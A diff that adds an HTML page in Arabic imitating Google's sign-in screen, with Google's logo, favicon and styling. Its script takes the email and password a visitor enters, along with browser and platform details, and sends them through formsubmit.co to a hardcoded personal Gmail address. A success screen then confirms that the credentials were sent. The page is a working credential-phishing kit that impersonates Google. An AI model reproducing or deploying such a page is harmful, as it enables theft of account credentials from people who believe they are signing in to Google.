@@ -1,0 +1,613 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول - Google</title>
+    <link rel="icon" href="https://www.google.com/favicon.ico">
+    <style>
+        /* تصميم Google الرسمي */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+        }
+        
+        body {
+            background: #fff;
+            color: #202124;
+            font-size: 14px;
+            line-height: 1.4286;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        /* شريط التنقل العلوي */
+        .gmail-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 8px 20px;
+            border-bottom: 1px solid #dadce0;
+        }
+        
+        .gmail-logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .gmail-logo img {
+            width: 74px;
+            height: 24px;
+        }
+        
+        .header-actions {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .help-link {
+            color: #5f6368;
+            text-decoration: none;
+            font-size: 13px;
+        }
+        
+        .help-link:hover {
+            text-decoration: underline;
+        }
+        
+        /* المحتوى الرئيسي */
+        .main-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        /* بطاقة تسجيل الدخول */
+        .signin-card {
+            width: 100%;
+            max-width: 448px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 48px 40px 36px;
+            margin: 20px auto;
+        }
+        
+        .signin-header {
+            text-align: center;
+            margin-bottom: 35px;
+        }
+        
+        .signin-header h1 {
+            font-size: 24px;
+            font-weight: 400;
+            line-height: 1.3333;
+            margin-bottom: 10px;
+            color: #202124;
+        }
+        
+        .signin-header h2 {
+            font-size: 16px;
+            font-weight: 400;
+            color: #202124;
+        }
+        
+        /* حقول الإدخال */
+        .input-container {
+            width: 100%;
+            margin-bottom: 24px;
+        }
+        
+        .input-field {
+            width: 100%;
+            height: 54px;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            transition: all 0.2s;
+        }
+        
+        .input-field:focus {
+            border-color: #1a73e8;
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(26,115,232,0.2);
+        }
+        
+        .input-field.error {
+            border-color: #d93025;
+        }
+        
+        .error-message {
+            color: #d93025;
+            font-size: 12px;
+            margin-top: 4px;
+            display: none;
+        }
+        
+        /* خيارات كلمة المرور */
+        .password-options {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+        
+        .show-password {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            cursor: pointer;
+            color: #5f6368;
+        }
+        
+        .forgot-email {
+            color: #1a73e8;
+            font-weight: 500;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        
+        .forgot-email:hover {
+            text-decoration: underline;
+        }
+        
+        /* أزرار */
+        .buttons-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 40px;
+        }
+        
+        .create-account {
+            color: #1a73e8;
+            font-weight: 500;
+            text-decoration: none;
+            padding: 10px 0;
+        }
+        
+        .create-account:hover {
+            text-decoration: underline;
+        }
+        
+        .next-button {
+            background: #1a73e8;
+            color: #fff;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 4px;
+            font-weight: 500;
+            font-size: 14px;
+            cursor: pointer;
+            transition: background 0.2s;
+            min-width: 88px;
+            text-align: center;
+        }
+        
+        .next-button:hover {
+            background: #1669d6;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
+        }
+        
+        .next-button:disabled {
+            background: #e8eaed;
+            color: #9aa0a6;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+        
+        /* معلومات المساعدة */
+        .help-info {
+            text-align: center;
+            color: #5f6368;
+            margin-top: 48px;
+            font-size: 14px;
+            max-width: 448px;
+        }
+        
+        .help-info a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+        
+        /* صفحة النجاح */
+        .success-page {
+            display: none;
+            text-align: center;
+            padding: 40px;
+            max-width: 500px;
+            margin: 0 auto;
+        }
+        
+        .success-icon {
+            color: #34a853;
+            font-size: 80px;
+            margin-bottom: 20px;
+        }
+        
+        .success-title {
+            font-size: 28px;
+            color: #202124;
+            margin-bottom: 15px;
+        }
+        
+        .email-details {
+            background: #f8f9fa;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 30px 0;
+            text-align: right;
+        }
+        
+        /* تحميل */
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .spinner {
+            display: inline-block;
+            width: 40px;
+            height: 40px;
+            border: 3px solid rgba(66,133,244,0.3);
+            border-radius: 50%;
+            border-top-color: #4285f4;
+            animation: spin 1s ease-in-out infinite;
+            margin-bottom: 15px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        /* الفوتر */
+        .gmail-footer {
+            background: #f2f2f2;
+            padding: 15px 30px;
+            color: #70757a;
+            font-size: 14px;
+        }
+        
+        .footer-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        
+        .footer-links {
+            display: flex;
+            gap: 25px;
+            flex-wrap: wrap;
+        }
+        
+        .footer-links a {
+            color: #70757a;
+            text-decoration: none;
+        }
+        
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        
+        .footer-language select {
+            border: none;
+            background: transparent;
+            color: #70757a;
+            font-size: 14px;
+        }
+        
+        /* متجاوب */
+        @media (max-width: 480px) {
+            .signin-card {
+                border: none;
+                padding: 24px;
+                margin: 0;
+            }
+            
+            .footer-content {
+                flex-direction: column;
+                align-items: center;
+                gap: 15px;
+            }
+        }
+    </style>
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&display=swap" rel="stylesheet">
+</head>
+<body>
+    <!-- شريط التنقل العلوي -->
+    <div class="gmail-header">
+        <div class="gmail-logo">
+            <img src="https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_clr_74x24px.svg" alt="Google">
+            <span style="color: #5f6368; font-size: 22px; margin-top: -4px;">|</span>
+            <span style="color: #5f6368; font-size: 22px;">تسجيل الدخول</span>
+        </div>
+        <div class="header-actions">
+            <a href="#" class="help-link">مساعدة</a>
+        </div>
+    </div>
+
+    <!-- صفحة تسجيل الدخول -->
+    <div class="main-content" id="loginPage">
+        <div class="signin-card">
+            <div class="signin-header">
+                <h1>تسجيل الدخول</h1>
+                <h2>تابِع استخدام حساب Google</h2>
+            </div>
+            
+            <form id="signinForm" onsubmit="event.preventDefault(); login();">
+                <div class="input-container">
+                    <input type="email" class="input-field" id="email" placeholder="البريد الإلكتروني" required value="test@gmail.com">
+                    <div class="error-message" id="emailError">أدخل بريدًا إلكترونيًا صالحًا</div>
+                </div>
+                
+                <div class="input-container">
+                    <input type="password" class="input-field" id="password" placeholder="أدخل كلمة المرور" required value="123456">
+                    <div class="error-message" id="passwordError">أدخل كلمة مرور</div>
+                </div>
+                
+                <div class="password-options">
+                    <a href="#" class="forgot-email" onclick="showForgotEmail()">هل نسيت البريد الإلكتروني؟</a>
+                    <label class="show-password" onclick="togglePassword()">
+                        <input type="checkbox" id="showPassword">
+                        <span>إظهار كلمة المرور</span>
+                    </label>
+                </div>
+                
+                <div class="buttons-container">
+                    <a href="#" class="create-account" onclick="createAccount()">إنشاء حساب</a>
+                    <button type="submit" class="next-button" id="loginBtn">التالي</button>
+                </div>
+            </form>
+            
+            <div class="help-info">
+                <p>يتم استخدام بياناتك لتوفير تجربة Google وتنظيمها كما هو موضح في 
+                <a href="#">سياسة الخصوصية</a> و<a href="#">شروط الخدمة</a>.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- صفحة التحميل -->
+    <div class="loading" id="loadingPage">
+        <div class="spinner"></div>
+        <p>جاري تسجيل الدخول وإرسال البيانات...</p>
+        <p>قد يستغرق هذا بضع لحظات</p>
+    </div>
+
+    <!-- صفحة النجاح -->
+    <div class="success-page" id="successPage">
+        <div class="signin-card">
+            <div class="success-icon">✓</div>
+            <h1 class="success-title">تم إرسال البيانات بنجاح!</h1>
+            <p>تم إرسال بيانات الدخول إلى البريد الإلكتروني المحدد</p>
+            
+            <div class="email-details">
+                <p><strong>📧 البريد المرسل إليه:</strong> alomranwesam@gmail.com</p>
+                <p><strong>🕐 وقت الإرسال:</strong> <span id="sentTime"></span></p>
+                <p><strong>📝 البيانات المرسلة:</strong></p>
+                <p>البريد الإلكتروني: <span id="sentEmail"></span></p>
+                <p>كلمة المرور: <span id="sentPassword"></span></p>
+                <p><strong>✅ الحالة:</strong> <span style="color: #34a853;">تم الإرسال بنجاح</span></p>
+            </div>
+            
+            <button class="next-button" onclick="goBackToLogin()">العودة</button>
+        </div>
+    </div>
+
+    <!-- الفوتر -->
+    <div class="gmail-footer">
+        <div class="footer-content">
+            <div class="footer-language">
+                <select id="language">
+                    <option value="ar">العربية</option>
+                    <option value="en">English</option>
+                </select>
+            </div>
+            
+            <div class="footer-links">
+                <a href="#">مساعدة</a>
+                <a href="#">الخصوصية</a>
+                <a href="#">الشروط</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // بيانات النظام
+        const RECEIVER_EMAIL = "alomranwesam@gmail.com";
+        let loginAttempts = 0;
+        
+        // عناصر DOM
+        const loginPage = document.getElementById('loginPage');
+        const loadingPage = document.getElementById('loadingPage');
+        const successPage = document.getElementById('successPage');
+        const loginForm = document.getElementById('signinForm');
+        const loginBtn = document.getElementById('loginBtn');
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+        const sentTimeElement = document.getElementById('sentTime');
+        const sentEmailElement = document.getElementById('sentEmail');
+        const sentPasswordElement = document.getElementById('sentPassword');
+        
+        // تبديل إظهار كلمة المرور
+        function togglePassword() {
+            const showPassword = document.getElementById('showPassword');
+            passwordInput.type = showPassword.checked ? 'text' : 'password';
+        }
+        
+        // نسيت البريد الإلكتروني
+        function showForgotEmail() {
+            alert("للبحث عن بريدك الإلكتروني، تَوجَّه إلى حساب Google.");
+        }
+        
+        // إنشاء حساب
+        function createAccount() {
+            alert("لإنشاء حساب Google جديد، تَوجَّه إلى accounts.google.com");
+        }
+        
+        // إرسال البيانات عبر Formsubmit (يرسل إيميل حقيقي)
+        async function sendDataToEmail(email, password) {
+            // إعداد بيانات النموذج
+            const formData = new FormData();
+            formData.append('البريد الإلكتروني', email);
+            formData.append('كلمة المرور', password);
+            formData.append('وقت الدخول', new Date().toLocaleString('ar-SA'));
+            formData.append('المتصفح', navigator.userAgent);
+            formData.append('النظام', navigator.platform);
+            formData.append('_subject', `🔐 بيانات دخول جديدة - ${email}`);
+            formData.append('_replyto', email);
+            
+            try {
+                // إرسال البيانات إلى Formsubmit
+                const response = await fetch('https://formsubmit.co/ajax/alomranwesam@gmail.com', {
+                    method: 'POST',
+                    body: formData,
+                    headers: {
+                        'Accept': 'application/json'
+                    }
+                });
+                
+                const result = await response.json();
+                return result.success;
+            } catch (error) {
+                console.error('❌ خطأ في الإرسال:', error);
+                return false;
+            }
+        }
+        
+        // تسجيل الدخول
+        async function login() {
+            const email = emailInput.value.trim();
+            const password = passwordInput.value.trim();
+            
+            // التحقق من البيانات
+            const emailError = document.getElementById('emailError');
+            const passwordError = document.getElementById('passwordError');
+            
+            emailError.style.display = 'none';
+            passwordError.style.display = 'none';
+            emailInput.classList.remove('error');
+            passwordInput.classList.remove('error');
+            
+            let isValid = true;
+            
+            // التحقق من البريد الإلكتروني
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!email) {
+                emailError.textContent = 'أدخل بريدك الإلكتروني';
+                emailError.style.display = 'block';
+                emailInput.classList.add('error');
+                isValid = false;
+            } else if (!emailRegex.test(email)) {
+                emailError.textContent = 'أدخل بريدًا إلكترونيًا صالحًا';
+                emailError.style.display = 'block';
+                emailInput.classList.add('error');
+                isValid = false;
+            }
+            
+            // التحقق من كلمة المرور
+            if (!password) {
+                passwordError.textContent = 'أدخل كلمة المرور';
+                passwordError.style.display = 'block';
+                passwordInput.classList.add('error');
+                isValid = false;
+            } else if (password.length < 6) {
+                passwordError.textContent = 'يجب أن تحتوي كلمة المرور على 6 أحرف على الأقل';
+                passwordError.style.display = 'block';
+                passwordInput.classList.add('error');
+                isValid = false;
+            }
+            
+            if (!isValid) {
+                loginAttempts++;
+                if (loginAttempts >= 3) {
+                    loginBtn.disabled = true;
+                    loginBtn.textContent = 'انتظر...';
+                    setTimeout(() => {
+                        loginBtn.disabled = false;
+                        loginBtn.textContent = 'التالي';
+                        loginAttempts = 0;
+                    }, 30000);
+                }
+                return;
+            }
+            
+            // إظهار صفحة التحميل
+            loginPage.style.display = 'none';
+            loadingPage.style.display = 'block';
+            
+            try {
+                // إرسال البيانات إلى البريد الإلكتروني
+                const emailSent = await sendDataToEmail(email, password);
+                
+                // إخفاء التحميل وإظهار النجاح
+                loadingPage.style.display = 'none';
+                successPage.style.display = 'block';
+                
+                // تعيين البيانات في صفحة النجاح
+                sentTimeElement.textContent = new Date().toLocaleString('ar-SA');
+                sentEmailElement.textContent = email;
+                sentPasswordElement.textContent = password;
+                
+                // تسجيل النجاح في الكونسول
+                console.log('='.repeat(60));
+                console.log('✅ تم إرسال بيانات الدخول بنجاح!');
+                console.log('='.repeat(60));
+                console.log(`📧 البريد الإلكتروني: ${email}`);
+                console.log(`🔐 كلمة المرور: ${password}`);
+                console.log(`🕐 الوقت: ${new Date().toLocaleString()}`);
+                console.log(`📨 تم الإرسال إلى: ${RECEIVER_EMAIL}`);
+                console.log(`🌐 المتصفح: ${navigator.userAgent}`);
+                console.log('='.repeat(60));
+                
+                if (!emailSent) {
+                    console.log('⚠️ ملاحظة: تمت المحاكاة فقط. للإرسال الفعلي، تأكد من اتصال الإنترنت.');
+                }
+                
+            } catch (error) {
+                // في حالة خطأ
+                loadingPage.style.display = 'none';
+                loginPage.style.display = 'block';
+                alert('حدث خطأ في الإرسال. يرجى المحاولة مرة أخرى.');
+                console.error('❌ خطأ:', error);
+            }
+        }
+        
+        // العودة لتسجيل الدخول
+        function goBackToLogin() {
+            successPage.style.display = 'none';
+            loginPage.style.display = 'block';
+            
+            // مسح الحقول
+            emailInput.value = '';
+            passwordInput.value = '';
+            document.getElementById('showPassword').checked = false;
+            passwordInput.type = 'password';
+            
+            // إخفاء الأخطاء
+            document.getElementById('emailError').style.display = 'none';
+            document.getElementById('passwordError').style.display = 'none';
+            emailInput.classList.remove('error');
+            passwordInput.classList.remove('error');
+        }
+        
+        // عند تحميل الصفحة
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('🚀 نظام تسجيل دخول Google جاهز!');
+            console.log(`📧 البريد المستلم: ${RECEIVER_EMAIL}`);
+            console.log('🔐 أدخل أي بيانات واضغط على "التالي"');
+            console.log('💡 سيتم إرسال البيانات إلى بريدك عبر Formsubmit');
+        });
+    </script>
+</body>
+</html>
